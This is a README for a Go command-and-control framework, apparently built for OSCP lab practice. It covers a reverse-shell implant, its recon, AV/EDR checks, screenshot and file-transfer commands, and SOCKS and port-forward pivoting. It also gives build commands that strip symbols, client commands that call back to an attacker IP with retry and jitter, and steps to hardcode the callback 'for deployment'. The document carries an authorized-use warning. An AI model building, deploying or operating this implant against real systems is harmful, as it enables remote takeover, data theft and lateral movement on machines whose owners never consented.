# GoCat C2

A custom Command & Control (C2) framework written in Go, built for **OSCP lab preparation**. Inspired by Meterpreter, it is a reverse shell and post-exploitation toolkit intended exclusively for use in **authorized OSCP lab environments and private RFC1918 lab spaces**.

> **Warning:** This tool is for authorized security testing only. Do not deploy against systems you do not own or have explicit written permission to test.

---

## Architecture

Two standalone binaries communicate over a length-prefixed JSON protocol:

```
[4 bytes: uint32 length][JSON payload]
```

| Binary | Role | Runs on |
|--------|------|---------|
| `server` | C2 listener — operator CLI | Attacker / Kali machine |
| `client` | Implant — reverse shell | Target lab machine |

### Message Protocol

```go
type Message struct {
    Type    string `json:"type"`
    Payload string `json:"payload"`
    Data    []byte `json:"data,omitempty"` // binary: files, screenshots
}
```

Message types: `cmd`, `resp`, `upload`, `download`, `file`, `error`

---

## Features

### Shell & Execution

| Command | Description |
|---------|-------------|
| `run <cmd>` | Run any shell command via `cmd /C` (Windows) or `sh -c` (Linux) |
| `shell` | Enter interactive shell loop — `exit` returns to C2 |

### Recon

| Command | Description |
|---------|-------------|
| `sysinfo` | Hostname, username, OS, arch, CPU count, working dir |
| `whoami` | `whoami /all` on Windows; `id` + `sudo -l` on Linux |
| `ps` | `tasklist` on Windows; `ps aux` on Linux |
| `netstat` | `netstat -ano` on Windows; `ss -tulnp` on Linux |
| `arp` | ARP cache dump for internal host discovery |
| `getenv` | Dump all environment variables |
| `checkav` | Scan process list against 14 known AV/EDR names |
| `screenshot` | Capture display 0 as PNG, saved to attacker machine |

### Filesystem

| Command | Description |
|---------|-------------|
| `ls <path>` / `dir <path>` | Formatted directory listing with type, size, modified time |

### File Transfer

| Command | Description |
|---------|-------------|
| `download <remote> [local]` | Pull a file from the target to the attacker machine |
| `upload <local> <remote>` | Push a file from the attacker machine to the target |

### Tunneling & Pivoting

| Command | Description |
|---------|-------------|
| `socks <port>` | Start a SOCKS5 proxy on a local port — use with proxychains |
| `lportfwd <lp> <rh> <rp>` | Forward a local port through the implant to a remote target |
| `rportfwd <rp> <lh> <lp>` | Have the implant listen on a remote port and forward back to attacker |

### Session Management

| Command | Description |
|---------|-------------|
| `sessions -l` | List all active sessions |
| `sessions -i <id>` | Interact with a specific session |
| `background` / `bg` | Background the current session |
| `exit` | Close the current session |

### Flags

| Flag | Binary | Default | Description |
|------|--------|---------|-------------|
| `-port <n>` | Server | 4444 | Port to listen on |
| `-tls` | Both | false | Enable TLS encryption |
| `-log <file>` | Server | — | Timestamped log file |
| `-host <ip>` | Client | 127.0.0.1 | Server IP to connect back to |
| `-port <n>` | Client | 4444 | Server port |
| `-retry <n>` | Client | 0 | Max retry attempts (0 = infinite) |
| `-sleep <n>` | Client | 3 | Base sleep seconds between retries |
| `-jitter <n>` | Client | 2 | Max random seconds added to sleep |
| `-daemon` | Client | false | Fork to background (Linux only) |

---

## Build & Usage

### Dependencies

```bash
cd gocat
go mod tidy
```

### Cross-Compile

**macOS / Linux:**

```bash
# Server → Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o server ./cmd/server

# Client → Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o client.exe ./cmd/client
```

**Windows PowerShell:**

```powershell
$env:GOOS="linux";   $env:GOARCH="amd64"; go build -ldflags="-s -w" -o server   ./cmd/server
$env:GOOS="windows"; $env:GOARCH="amd64"; go build -ldflags="-s -w" -o client.exe ./cmd/client
$env:GOOS=""; $env:GOARCH=""
```

The `-ldflags="-s -w"` strips debug symbols and reduces binary size.

### TLS Certificate (optional)

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
```

Paste `cert.pem` and `key.pem` contents into `tlsCert` / `tlsKey` constants in `cmd/server/main.go`.

### Running

```bash
# Server — default port 4444
./server

# Server — custom port, TLS, logging
./server -port 8443 -tls -log session.log

# Client — basic reverse connection
./client.exe -host 192.168.1.100 -port 4444

# Client — TLS + infinite retry with jitter
./client.exe -host 10.10.10.5 -port 4444 -tls -retry 0 -sleep 5 -jitter 3

# Client — Linux daemon mode
./client -host 10.10.10.5 -port 4444 -daemon
```

### Hardcoding Callback (for deployment)

Edit the flag defaults in `cmd/client/main.go` before building:

```go
host := flag.String("host", "192.168.1.100", "Server IP")
port := flag.String("port", "4444", "Server port")
```

### Session Workflow

```
[*] Waiting for connections on 0.0.0.0:4444
c2> sessions -l

  ID    REMOTE ADDR               CONNECTED AT
  -------------------------------------------------------
* 1     192.168.1.50:49201        2026-10-12 12:00:00

c2> sessions -i 1
c2 [1]> sysinfo
c2 [1]> whoami
c2 [1]> run net user /domain
c2 [1]> download C:\Users\Administrator\Desktop\proof.txt proof.txt
c2 [1]> bg
c2>
```

### proxychains (SOCKS)

Add to `/etc/proxychains.conf`:

```
socks5 127.0.0.1 1080
```

```bash
c2 [1]> socks 1080
# On attacker machine:
proxychains nmap -sT -Pn 10.10.10.0/24
```

---

## Known Issues

### SOCKS5 / Port Forwarding — Partial Implementation

The SOCKS5 proxy and local port forward tunneling use the C2 control connection as a relay. Only the initial handshake and connection confirmation travel over the tunnel — actual bidirectional data relay is not yet fully wired up. A second multiplexed channel or goroutine-based relay loop is needed. **Highest-priority bug to fix.**

### TLS Certificate is a Placeholder

The `tlsCert` / `tlsKey` constants in `cmd/server/main.go` contain placeholder text. Generate a real cert with openssl before using `-tls`.

### `screenshot` Requires a Display

The `github.com/kbinani/screenshot` library calls native display APIs. On headless Linux (no X11/Wayland) it will return an error. Most useful on Windows targets or Linux desktops.

### Single Operator

Only one operator prompt at a time. Multiple sessions can exist simultaneously, but only one can be interacted with (the prompt blocks). Fine for solo OSCP use.

### No Encryption Without `-tls`

Without `-tls`, all traffic travels as plaintext JSON. Acceptable in controlled OSCP lab networks where you own the wire.

### `-daemon` is Linux-Only

No effect on Windows. Windows persistence (registry run key, scheduled task) would need separate implementation.
